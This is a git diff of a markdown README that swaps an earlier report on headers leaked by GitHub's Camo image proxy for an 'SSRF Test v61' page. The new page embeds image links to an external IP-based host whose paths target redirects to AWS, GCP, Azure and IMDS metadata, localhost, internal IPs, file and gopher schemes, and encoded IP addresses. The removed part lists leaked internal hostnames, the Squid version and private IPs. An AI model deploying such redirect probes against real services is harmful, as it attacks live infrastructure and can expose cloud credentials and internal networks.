@@ -1,43 +1,55 @@
-# v60: COMPREHENSIVE HEADER DISCLOSURE VERIFICATION
+# SSRF Test v61
 
-## 🔥 Information Disclosure in GitHub Camo Image Proxy
+## AWS Metadata Redirect Test
 
-> **Status:** VERIFIED - 200 commits of testing
-> **Finding:** Internal infrastructure leakage via HTTP headers
+![AWS Metadata](http://164.90.187.218.nip.io:9999/aws)
 
----
+## GCP Metadata Redirect Test
 
-## Live Tests (Triggers Camo requests to capture headers)
+![GCP Metadata](http://164.90.187.218.nip.io:9999/gcp)
 
-### Primary Header Capture
-![primary](http://164.90.187.218.nip.io:8888/headers?v60primary)
+## Azure Metadata Redirect Test
 
-### Secondary Header Capture
-![secondary](http://164.90.187.218.nip.io:8888/headers?v60secondary)
+![Azure Metadata](http://164.90.187.218.nip.io:9999/azure)
 
-### Tertiary Header Capture
-![tertiary](http://164.90.187.218.nip.io:8888/headers?v60tertiary)
+## Localhost Redirect Test
 
-### Additional Tests
-![test1](http://164.90.187.218.nip.io:8888/headers?v60t1)
-![test2](http://164.90.187.218.nip.io:8888/headers?v60t2)
-![test3](http://164.90.187.218.nip.io:8888/headers?v60t3)
-![test4](http://164.90.187.218.nip.io:8888/headers?v60t4)
-![test5](http://164.90.187.218.nip.io:8888/headers?v60t5)
+![Localhost](http://164.90.187.218.nip.io:9999/localhost)
 
----
+## Internal IP Redirect Test
 
-## Summary of Findings
+![Internal](http://164.90.187.218.nip.io:9999/internal)
 
-| Header | Leaked Data Type |
-|--------|------------------|
-| Via | Internal proxy hostnames |
-| Via | Squid 6.2 version |
-| X-Forwarded-For | RFC 1918 private IPs |
-| User-Agent | Camo build hash |
+## IMDS Redirect Test
 
----
+![IMDS](http://164.90.187.218.nip.io:9999/imds)
 
-**v60** - Comprehensive Header Disclosure Verification Complete
+## File Protocol Test
 
-**Total Test Commits:** 200
+![File](http://164.90.187.218.nip.io:9999/file)
+
+## Gopher Protocol Test
+
+![Gopher](http://164.90.187.218.nip.io:9999/gopher)
+
+## Decimal IP Test
+
+![Decimal](http://164.90.187.218.nip.io:9999/decimal)
+
+## Hex IP Test
+
+![Hex](http://164.90.187.218.nip.io:9999/hex)
+
+## Octal IP Test
+
+![Octal](http://164.90.187.218.nip.io:9999/octal)
+
+## IPv6 Test
+
+![IPv6](http://164.90.187.218.nip.io:9999/ipv6)
+
+## Chain Redirect Test
+
+![Chain](http://164.90.187.218.nip.io:9999/chain)
+
+Timestamp: 2026-01-12T14:51:00Z
